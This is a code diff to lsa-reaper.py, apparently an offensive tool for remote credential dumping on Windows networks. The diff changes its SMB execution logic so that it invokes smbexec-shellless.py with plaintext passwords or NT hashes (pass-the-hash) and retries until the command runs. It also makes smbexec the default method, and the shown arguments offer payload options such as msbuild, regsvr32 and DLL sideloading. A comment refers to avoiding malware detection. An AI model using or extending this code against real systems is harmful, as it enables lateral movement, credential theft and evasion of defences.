@@ -222,48 +222,54 @@ class SMBEXECShell():
             if str(e).lower().find('dce') != -1:
                 printnlog('DCE RPC Error')
             elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:
-                if logging.getLogger().level == logging.DEBUG:
-                    printnlog('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
-                else:
-                    lognoprint('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
-                # run the command
-                if password != '' and nthash == '': # if we are using a password to authenticate
-                    if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
-                        printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))
-                    else:  # otherwise just log it to the outputfile
-                        lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))
-                        
-                    data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+                if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)):
+                    if logging.getLogger().level == logging.DEBUG: # ok we got the dumb error that I cant track down so were gonna just run smbexec-shellless until it works
+                        printnlog('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
+                    else:
+                        lognoprint('{}: Status object error happened switching to smbexec-shellless loophole\n'.format(addr))
+                    # run the command
+                    if password != '' and nthash == '': # if we are using a password to authenticate
+                        if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
+                            printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))
+                        else:  # otherwise just log it to the outputfile
+                            lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\'\n'.format(addr, cwd, domain, username, password, addr, command2run))
 
-                    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                         data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+
+                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+                            data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}:\'{}\'@{}  \'{}\''.format(cwd, domain, username, password, addr, command2run))
+                            if logging.getLogger().level == logging.DEBUG:
+                                printnlog('{}: {}'.format(addr, data_out))
+                            else:
+                                lognoprint('{}: {}'.format(addr, data_out))
+
+                    else:# if we are using a nthash to authenticate
+
                         if logging.getLogger().level == logging.DEBUG:
-                            printnlog('{}: {}'.format(addr, data_out))
-                        else:
-                            lognoprint('{}: {}'.format(addr, data_out))
-                        
-                else:# if we are using a nthash to authenticate
+                            printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))
+                        else:  # otherwise just log it to the outputfile
+                            lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))
+
+                        data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+
+                        while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
+                            data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
+                            if logging.getLogger().level == logging.DEBUG: # logging stuff
+                                printnlog('{}: {}'.format(addr, data_out))
+                            else:
+                                lognoprint('{}: {}'.format(addr, data_out))
 
                     if logging.getLogger().level == logging.DEBUG:
-                        printnlog('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))
-                    else:  # otherwise just log it to the outputfile
-                        lognoprint('{}: Executing python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\'\n'.format(addr, cwd, domain, username, addr, nthash, command2run))
-
-                    data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
-
-                    while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1:  # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
-                        data_out = subprocess.getoutput('python3 {}/smbexec-shellless.py {}/{}@{} -hashes \'{}\' \'{}\''.format(cwd, domain, username, addr, nthash, command2run))
-                        if logging.getLogger().level == logging.DEBUG:
-                            printnlog('{}: {}'.format(addr, data_out))
-                        else:
-                            lognoprint('{}: {}'.format(addr, data_out))
-
-                if logging.getLogger().level == logging.DEBUG:  # if were debugging print the output of smbexec-shellless
-                    printnlog(data_out)
-                else:  # otherwise just log it to the outputfile
-                    lognoprint(data_out)
+                        printnlog('{}: {}'.format(addr, data_out))
+                    else:
+                        lognoprint('{}: {}'.format(addr, data_out))
+                else:
+                    printnlog('You dont seem to have {}/smbexec-shellless.py you should put that in the same directory as lsa-reaper.py as it is required'.format(cwd))
             else:
                 printnlog('Error in here: {}'.format(str(e)))
+                import traceback
+                traceback.print_exc()
+
 
 
     def finish(self):
@@ -2452,7 +2458,7 @@ if __name__ == '__main__':
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
-    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
+    parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     parser.add_argument('-payload', '-p', action='store', default='exe-mdwdpss', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd', 'exe-rtlcp'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
@@ -2506,6 +2512,11 @@ if __name__ == '__main__':
 
     #if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
         #options.share = 'ADMIN$' # ADMIN$ has been getting flaged as malware with wmiexec so moving it to default to C$
+
+    if options.method == 'smbexec' or options.relayx:
+        if os.path.isfile('{}/smbexec-shellless.py'.format(cwd)) == False:
+            print('Error you are missing {}/smbexec-shellless.py go get it from github'.format(cwd))
+            sys.exit(1)
 
     if options.runasppl and options.method != 'smbexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec
         printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
